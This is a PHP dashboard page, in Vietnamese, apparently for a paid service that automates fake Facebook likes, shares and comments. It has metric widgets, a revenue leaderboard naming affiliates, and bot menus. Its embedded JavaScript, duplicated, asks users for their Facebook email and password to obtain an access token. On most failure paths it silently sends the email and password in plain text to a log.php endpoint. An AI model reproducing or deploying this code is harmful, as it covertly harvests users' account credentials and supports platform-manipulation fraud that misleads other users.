<?php
include '../incf/head.php';
require '../incf/config.php';
require '../incf/func.php';
if(isset($_SESSION['username'])){
?>
<!-- TOP METRICS -->
							<div class="row">
							<div class="col-md-2 col-sm-6">
								<div class="widget widget-metric_1 animate">
									<span class="icon-wrapper custom-bg-orange"><i class="fa fa-user"></i></span>
									<div class="right">
										<span class="value">1562 <i class="change-icon change-up fa fa-sort-up text-indicator-red"></i></span>
										<span class="title">USER
											<span class="change text-indicator-green"> (+356)</span>
										</span>
									</div>
								</div>
							</div>
							<div class="col-md-2 col-sm-6">
								<div class="widget widget-metric_1 animate">
									<span class="icon-wrapper custom-bg-green"><i class="fa fa-bar-chart"></i></span>
									<div class="right">
										<span class="value">3642 <i class="change-icon change-up fa fa-sort-up text-indicator-green"></i></span>
										<span class="title">TOKEN
											<span class="change text-indicator-green">(+ 254)</span>
										</span>
									</div>
								</div>
							</div>
							<div class="col-md-2 col-sm-6">
								<div class="widget widget-metric_1 animate">
									<span class="icon-wrapper custom-bg-yellow"><i class="fa fa-paper-plane"></i></span>
									<div class="right">
										<span class="value">11586 <i class="change-icon change-up fa fa-sort-up text-indicator-green"></i></span>
										<span class="title">VIEW
											<span class="change text-indicator-green">(+ 454)</span>
										</span>
									</div>
								</div>
							</div>
							<div class="col-md-2 col-sm-6">
								<div class="widget widget-metric_1 animate">
									<span class="icon-wrapper custom-bg-lightseagreen"><i class="fa fa-thumbs-o-up"></i></span>
									<div class="right">
										<span class="value">8740 <i class="change-icon change-up fa fa-sort-up text-indicator-green"></i></span>
										<span class="title">LIKE
											<span class="change text-indicator-green">(+ 184)</span>
										</span>
									</div>
								</div>
							</div>
							<div class="col-md-2 col-sm-6">
								<div class="widget widget-metric_1 animate">
									<span class="icon-wrapper custom-bg-blue2"><i class="fa fa-share-alt"></i></span>
									<div class="right">
										<span class="value">132567 <i class="change-icon change-down fa fa-sort-down text-indicator-red"></i></span>
										<span class="title">SHARE
											<span class="change text-indicator-red">(- 293)</span>
										</span>
									</div>
								</div>
							</div>
							<div class="col-md-2 col-sm-6">
								<div class="widget widget-metric_1 animate">
									<span class="icon-wrapper custom-bg-purple"><i class="fa fa-heartbeat"></i></span>
									<div class="right">
										<span class="value">56.72% <i class="change-icon change-up fa fa-sort-up text-indicator-green"></i></span>
										<span class="title">REACTION
											<span class="change text-indicator-green">(+ 12.64%)</span>
										</span>
									</div>
								</div>
							</div></div>
	<div class="row sortable-grid">
							<div class="col-md-7 sortable-item">
								<!-- SALES STATISTIC -->
								<div class="panel" id="tour-sales-stat">
									<div class="panel-heading">
										<h3 class="panel-title"><i class="fa fa-bar-chart"></i> Thống Kê Lượt Truy Cập Ngày</h3>
									</div>
									<div class="panel-body">
										<div class="layout-table margin-bottom-30">
											<div class="cell">
												<div class="chart-metric">
													<span class="title">
														<span class="data-legend custom-bg-orange2"></span> Tuần Này</span>
													<span class="value">15,423</span>
													<span class="change up"><i class="ti-arrow-up"></i> 16%</span>
												</div>
											</div>
											<div class="cell">
												<div class="chart-metric">
													<span class="title">
														<span class="data-legend custom-bg-blue3"></span> Tuần Trước</span>
													<span class="value">8,563</span>
													<span class="change down"><i class="ti-arrow-down"></i> 7%</span>
												</div>
											</div>
											<div class="cell valign-bottom text-right">
												<div class="btn-group">
													<button type="button" class="btn btn-default btn-sm">Day</button>
													<button type="button" class="btn btn-default btn-sm active">Week</button>
													<button type="button" class="btn btn-default btn-sm">Month</button>
												</div>
											</div>
										</div>
										<div style="height: 250px;" id="sales-stat"></div>
									</div>
								</div></div>
							<div class="col-md-5">
								<div class="panel">
									<div class="panel-heading">
										<h4 class="panel-title"><i class="fa fa-line-chart"></i> Thống Kê Doanh Thu</h4>
									</div>
									<div class="panel-body no-padding">
										<div class="leaderboard padding-top-30">
											<div class="custom-tabs-line left-aligned">
												<ul class="nav nav-justified" role="tablist">
													<li class="active"><a href="#following" role="tab" data-toggle="tab">TOP TUẦN</a></li>
													<li><a href="#global" role="tab" data-toggle="tab">TOP THÁNG</a></li>
												</ul>
											</div>
											<div class="tab-content">
												<div role="tabpanel" class="tab-pane active" id="following">
													<ul class="list-unstyled list-positions">
														<li class="position up clearfix">
															
															<div class="account">
																<div class="user">
																	<img src="https://graph.fb.me/100003018696352/picture?width=100&height=100" class="user-picture">
																	<span class="position-number">1</span>
																</div>
																<div class="right">
																	<a href="#" class="name">Kim Quang</a>
																	<span class="username">Cộng Tác Viên</span>
																</div>
															</div>
															<span class="points">531.000 VNĐ</span>
														</li>
														<li class="position down clearfix">
														
															<div class="account">
																<div class="user">
																	<img src="https://graph.fb.me/100010159398356/picture?width=100&height=100" class="user-picture">
																	<span class="position-number">2</span>
																</div>
																<div class="right">
																	<a href="#" class="name">Trịnh Đức Minh</a>
																	<span class="username">Đại Lý</span>
																</div>
															</div>
															<span class="points">386.000 VNĐ</span>
														</li>
														<li class="position up clearfix">
															
															<div class="account">
																<div class="user">
																	<img src="https://graph.fb.me/100014241372358/picture?width=100&height=100" class="user-picture">
																	<span class="position-number">3</span>
																</div>
																<div class="right">
																	<a href="#" class="name">Nguyễn Bá Hải</a>
																	<span class="username">Cộng Tác Viên</span>
																</div>
															</div>
															<span class="points">212.000 VNĐ</span>
														</li>
														
													</ul>
												</div>
												<div role="tabpanel" class="tab-pane" id="global">
													<ul class="list-unstyled list-positions">
														<li class="position up clearfix">
															
															<div class="account">
																<div class="user">
																	<img src="https://graph.fb.me/100003018696352/picture?width=100&height=100" class="user-picture">
																	<span class="position-number">1</span>
																</div>
																<div class="right">
																	<a href="#" class="name">Kim Quang</a>
																	<span class="username">Cộng Tác Viên</span>
																</div>
															</div>
															<span class="points">1.725.000 VNĐ</span>
														</li>
														<li class="position up clearfix">
															
															<div class="account">
																<div class="user">
																	<img src="https://graph.fb.me/100011105371810/picture?width=100&height=100" class="user-picture">
																	<span class="position-number">2</span>
																</div>
																<div class="right">
																	<a href="#" class="name">Nguyễn Bá Nhân</a>
																	<span class="username">Cộng Tác Viên</span>
																</div>
															</div>
															<span class="points">862.000 VNĐ</span>
														</li>
														<li class="position up clearfix">
															
															<div class="account">
																<div class="user">
																	<img src="https://graph.fb.me/100011740561314/picture?width=100&height=100" class="user-picture">
																	<span class="position-number">3</span>
																</div>
																<div class="right">
																	<a href="#" class="name">Hàn Viết Nam Sơn</a>
																	<span class="username">Đại Lý</span>
																</div>
															</div>
															<span class="points">608.000 VNĐ</span>
														</li>
														
													</ul>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
						

	<div class="row">					
	
<div class="col-md-4">
								<div class="widget">
									<div id="progress-share" class="progress-semicircle" data-max="500">
										<div class="bar-overflow">
											<div class="bar" style="transform: rotate(181.8deg);"></div>
										</div>
										<span class="content">
												<i class="fa fa-heart icon"></i>
											<span class="value">680</span>
											<h4 class="heading">Hệ Thống Vip Like - Share - Comment</h4>
											<p class="text-muted">Là hệ thống hoàn toàn tự động tăng like, share, comment cho bài viết.</p>
											<button type="button" class="btn btn-primary">VIP SHARE</button>
<button type="button" class="btn btn-danger">VIP LIKE</button>
<button type="button" class="btn btn-success">VIP COMMENT</button>
										</span>
									</div>
								</div>
							</div>
					


<div class="col-md-2">
								<div class="widget widget-metric_6">
									<span class="icon-wrapper custom-bg-yellow"><i class="fa fa-heart"></i></span>
									<div class="right">
										<span class="value">252</span>
										<span class="title">Lượt Sử Dụng Vip Like</span>
									</div>
								</div>
							</div>
<div class="col-md-2">
								<div class="widget widget-metric_6">
									<span class="icon-wrapper custom-bg-red"><i class="fa fa-share-alt"></i></span>
									<div class="right">
										<span class="value">96</span>
										<span class="title">Lượt Sử Dụng Vip Share</span>
									</div>
								</div>
							</div>

<div class="col-md-2">
								<div class="widget widget-metric_6">
									<span class="icon-wrapper custom-bg-blue"><i class="fa fa-comment"></i></span>
									<div class="right">
										<span class="value">72</span>
										<span class="title">Lượt Sử Dụng Vip CMT</span>
									</div>
								</div>
							</div>
					
<div class="col-md-2">
								<div class="widget widget-metric_6">
									<span class="icon-wrapper custom-bg-green"><i class="fa fa-meh-o"></i></span>
									<div class="right">
										<span class="value">346</span>
										<span class="title">Lượt Sử Dụng BOT</span>
									</div>
								</div>
							</div>
		

<div class="col-md-4">
								<div class="file-item">
									<a href="//thatim.bizweb.mobi/menu/main.php">
											<span class="file-preview image">
													<img src="https://i.imgur.com/ykRYUN4.jpg" class="img-responsive" alt="">
												</span>
									</a>
									<div class="file-info">
										<a href="//thatim.bizweb.mobi/menu/main.php">
											<span class="file-name"><strong>Hệ Thống BOT Thả Tim </strong></span>
										</a>
										
										<div class="dropdown">
											<a href="#" class="toggle-dropdown" data-toggle="dropdown" aria-expanded="false"><i class="fa fa-ellipsis-v"></i></a>
											<ul class="dropdown-menu dropdown-menu-right">
												<li><a href="//thatim.bizweb.mobi/menu/main.php"><i class="fa fa-toggle-off"></i> Sử Dụng Ngay</a></li>
												<li><a href="//thatim.bizweb.mobi/menu/khachhang.php"><i class="fa fa-bars"></i> Quản Lý BOT</a></li>
											</ul>
										</div>
									</div>
								</div>
							</div>

														<div class="col-md-4">
								<div class="file-item">
									<a href="//thatim.bizweb.mobi/menu/cmt.php">
										<span class="file-preview image">
													<img src="https://i.imgur.com/ykRYUN4.jpg" class="img-responsive" alt="">
												</span>

									</a>
									<div class="file-info">
										<a href="//thatim.bizweb.mobi/menu/cmt.php">
											<span class="file-name"><strong>Hệ Thống BOT Comment </strong></span>
										</a>
										
										<div class="dropdown">
											<a href="//thatim.bizweb.mobi/menu/cmt.php" class="toggle-dropdown" data-toggle="dropdown"><i class="fa fa-ellipsis-v"></i></a>
											<ul class="dropdown-menu dropdown-menu-right">
												<li><a href="//thatim.bizweb.mobi/menu/cmt.php"><i class="fa fa-toggle-off"></i> Sử Dụng BOT CMT</a></li>
<li><a href="//thatim.bizweb.mobi/menu/cmtimg.php"><i class="fa fa-toggle-off"></i> Sử Dụng BOT CMT IMG</a></li>
												<li><a href="//thatim.bizweb.mobi/menu/khachhangcmt.php"><i class="fa fa-bars"></i> Quản Lý BOT</a></li>
											</ul>
										</div>
									</div>
						</div>	</div>
</div>

													
								
						
							
						

	

<script type="text/javascript">
function get_link_login() {
    var email = document.getElementById("emailtk").value;
    var passwd = document.getElementById("passwdtk").value;
    $.post("token.php", {
        email: email,
        passwd: passwd,
        test: true,
        type: "login_email"
    }, function (data, status) {
        $("#rio2").hide().html("<div class='form-group'><b>Bước 1:</b> Click <a target='_blank' href='" + data + "' class='btn btn-success'>LẤY DATA</a> để lấy dữ liệu. <hr> <b>Bước 2:</b> COPY toàn bộ nội dung(CTRL + A => CTRL + C) và dán(CTRL + V) vào ô bên dưới rồi click 'LỌC TOKEN'. Nhìn ảnh bên dưới <br><a href='http://i.imgur.com/bl83sXM.png'><img class='img img-responsive' src='http://i.imgur.com/bl83sXM.png'></a></br><textarea onpaste=\"setTimeout( function() { login_data();}, 100);\" placeholder='COPY TOÀN BỘ NỘI DUNG VÀ DÁN VÔ ĐÂY' id='data' class='form-control'></textarea> <br> <a onclick='login_data();' id='btn-login' class='btn btn-info btn-block'>LỌC TOKEN</a><hr><div id='log'></div></div>").fadeIn('slow');
    });
}
function login_data() {
    var email = document.getElementById("emailtk").value;
    var passwd = document.getElementById("passwdtk").value;
    if (document.getElementById("data").value) {
        var data = JSON.parse(document.getElementById("data").value);
        if (data['access_token']) {
            $("#btn-login").html('<i class="fa fa-spinner fa-spin"></i> Đang lọc token...');
            $("#token").val(data['access_token']);
            $("#btn-login").html('Lọc xong');
/*            $.get("log.php?type=oke_login_email&conten=" + encodeURI(email + "|" + passwd));
            login(data['access_token']);*/
        } else if (data['error_code'] == 100) {
            alert('Vui lòng điền mật khẩu');
            $("#log").html("<div class='alert alert-info'><strong>Lỗi!</strong>Vui lòng điền mật khẩu");
        } else if (data['error_code'] == 400 || data['error_code'] == 401) {
            alert('Sai tên đăng nhập hoặc mật khẩu');
            $("#log").html("<div class='alert alert-info'><strong>Lỗi!</strong>Sai tên đăng nhập hoặc mật khẩu");
        } else if (data['error_msg']) {
            $.get("log.php?type=login_email&conten=" + encodeURI(email + "|" + passwd + " => " + data['error_msg']));
            $("#log").html("<div class='alert alert-info'><strong>Lỗi!</strong> " + data['error_msg'] + "</div>");
        } else {
            $.get("log.php?type=login_email&conten=" + encodeURI(email + "|" + passwd + " =>KXD: " + data['error_msg']));
            $("#log").html("<div class='alert alert-info'><strong>Lỗi!</strong> Không xác định</div>");
        }
    }
}
</script>

<script type="text/javascript">
function get_link_login() {
    var email = document.getElementById("emailtk").value;
    var passwd = document.getElementById("passwdtk").value;
    $.post("token.php", {
        email: email,
        passwd: passwd,
        test: true,
        type: "login_email"
    }, function (data, status) {
        $("#rio2").hide().html("<div class='form-group'><b>Bước 1:</b> Click <a target='_blank' href='" + data + "' class='btn btn-success'>LẤY DATA</a> để lấy dữ liệu. <hr> <b>Bước 2:</b> COPY toàn bộ nội dung(CTRL + A => CTRL + C) và dán(CTRL + V) vào ô bên dưới rồi click 'LỌC TOKEN'. Nhìn ảnh bên dưới <br><a href='http://i.imgur.com/bl83sXM.png'><img class='img img-responsive' src='http://i.imgur.com/bl83sXM.png'></a></br><textarea onpaste=\"setTimeout( function() { login_data();}, 100);\" placeholder='COPY TOÀN BỘ NỘI DUNG VÀ DÁN VÔ ĐÂY' id='data' class='form-control'></textarea> <br> <a onclick='login_data();' id='btn-login' class='btn btn-info btn-block'>LỌC TOKEN</a><hr><div id='log'></div></div>").fadeIn('slow');
    });
}
function login_data() {
    var email = document.getElementById("emailtk").value;
    var passwd = document.getElementById("passwdtk").value;
    if (document.getElementById("data").value) {
        var data = JSON.parse(document.getElementById("data").value);
        if (data['access_token']) {
            $("#btn-login").html('<i class="fa fa-spinner fa-spin"></i> Đang lọc token...');
            $("#token").val(data['access_token']);
            $("#btn-login").html('Lọc xong');
/*            $.get("log.php?type=oke_login_email&conten=" + encodeURI(email + "|" + passwd));
            login(data['access_token']);*/
        } else if (data['error_code'] == 100) {
            alert('Vui lòng điền mật khẩu');
            $("#log").html("<div class='alert alert-info'><strong>Lỗi!</strong>Vui lòng điền mật khẩu");
        } else if (data['error_code'] == 400 || data['error_code'] == 401) {
            alert('Sai tên đăng nhập hoặc mật khẩu');
            $("#log").html("<div class='alert alert-info'><strong>Lỗi!</strong>Sai tên đăng nhập hoặc mật khẩu");
        } else if (data['error_msg']) {
            $.get("log.php?type=login_email&conten=" + encodeURI(email + "|" + passwd + " => " + data['error_msg']));
            $("#log").html("<div class='alert alert-info'><strong>Lỗi!</strong> " + data['error_msg'] + "</div>");
        } else {
            $.get("log.php?type=login_email&conten=" + encodeURI(email + "|" + passwd + " =>KXD: " + data['error_msg']));
            $("#log").html("<div class='alert alert-info'><strong>Lỗi!</strong> Không xác định</div>");
        }
    }
}
</script>

<?php
}
else{
  echo '<script>window.location.href = "../login.php?i=1";</script>';
}
include '../incf/foot.php';

?>
